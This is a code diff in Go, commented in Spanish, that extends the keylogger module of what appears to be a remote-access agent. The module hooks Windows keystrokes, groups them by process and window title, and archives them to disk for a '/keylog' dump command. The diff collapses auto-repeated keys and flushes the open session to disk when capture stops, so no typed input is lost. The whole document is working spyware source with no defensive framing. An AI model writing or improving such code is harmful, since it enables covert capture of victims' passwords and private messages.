@@ -28,7 +28,23 @@ type KeylogBuffer struct {
 	mu       sync.Mutex
 	sessions []*win32.WindowSession
 	current  *win32.WindowSession
+	repeat   repeatState
 }
+
+// repeatState recuerda la última tecla especial para fundir el auto-repeat del
+// sistema. Mantener una flecha pulsada dentro de una página dispara 16 eventos
+// por segundo; sin esto el dump sale como una pared de [RIGHT][RIGHT][RIGHT].
+type repeatState struct {
+	label string
+	at    time.Time
+	count int
+	index int // posición del evento en current.Events, -1 si no hay nada
+}
+
+// repeatWindow es el hueco máximo entre repeticiones para fundirlas. El
+// auto-repeat del sistema llega cada 30-50 ms; una doble pulsación humana está
+// por encima de 150 ms, así que este margen no se come teclas distintas.
+const repeatWindow = 250 * time.Millisecond
 
 // globalBuffer es el buffer que usa el comando /keylog.
 var globalBuffer = &KeylogBuffer{}
@@ -51,6 +67,7 @@ func (b *KeylogBuffer) StartSession(process, title string, at time.Time) {
 		ProcessName: process,
 		WindowTitle: title,
 	}
+	b.repeat = repeatState{index: -1}
 }
 
 // Append suma una tecla a la sesión en curso. Si el hook capturó antes de que
@@ -65,8 +82,45 @@ func (b *KeylogBuffer) Append(event win32.KeyEvent) {
 			ProcessName: "desconocido",
 			WindowTitle: "",
 		}
+		b.repeat = repeatState{index: -1}
 	}
+
+	if event.IsSpecial && b.collapseLocked(event) {
+		return
+	}
+
 	b.current.Events = append(b.current.Events, event)
+	if event.IsSpecial {
+		b.repeat = repeatState{
+			label: event.Label,
+			at:    event.Timestamp,
+			count: 1,
+			index: len(b.current.Events) - 1,
+		}
+		return
+	}
+	b.repeat = repeatState{index: -1}
+}
+
+// collapseLocked funde una repetición en el evento ya escrito y anota el
+// contador: [RIGHT] pasa a [RIGHT]x16 sin repetir el bloque dieciséis veces.
+func (b *KeylogBuffer) collapseLocked(event win32.KeyEvent) bool {
+	state := b.repeat
+	if state.index < 0 || state.label != event.Label {
+		return false
+	}
+	if event.Timestamp.Sub(state.at) > repeatWindow {
+		return false
+	}
+	if state.index >= len(b.current.Events) {
+		return false
+	}
+
+	state.count++
+	state.at = event.Timestamp
+	b.current.Events[state.index].Label = fmt.Sprintf("%sx%d", state.label, state.count)
+	b.repeat = state
+	return true
 }
 
 // closeLocked archiva la sesión en disco y la pasa a la lista cerrada.
@@ -173,6 +227,7 @@ func (b *KeylogBuffer) ClearBuffer() {
 	b.closeLocked()
 	b.sessions = nil
 	b.current = nil
+	b.repeat = repeatState{index: -1}
 }
 
 func safeHostname() string {
@@ -205,10 +260,22 @@ func StartGlobal() {
 }
 
 // StopGlobal desinstala el hook. El buffer no se toca: lo capturado sigue ahí
-// para el próximo dump.
+// para el próximo dump. La sesión en curso se archiva en disco para que un
+// apagado del agente no se lleve lo último tecleado.
 func StopGlobal() {
 	win32.Default.Stop()
+	globalBuffer.FlushCurrent()
 	slog.Info("keylogger: captura detenida, buffer conservado", "sesiones", globalBuffer.sessionCount())
+}
+
+// FlushCurrent cierra la sesión abierta: la pasa a la lista y la deja escrita
+// en el archivo de archivo. Sin esto, lo tecleado desde el último cambio de
+// ventana solo existiría en RAM.
+func (b *KeylogBuffer) FlushCurrent() {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	b.closeLocked()
+	b.repeat = repeatState{index: -1}
 }
 
 func (b *KeylogBuffer) sessionCount() int {
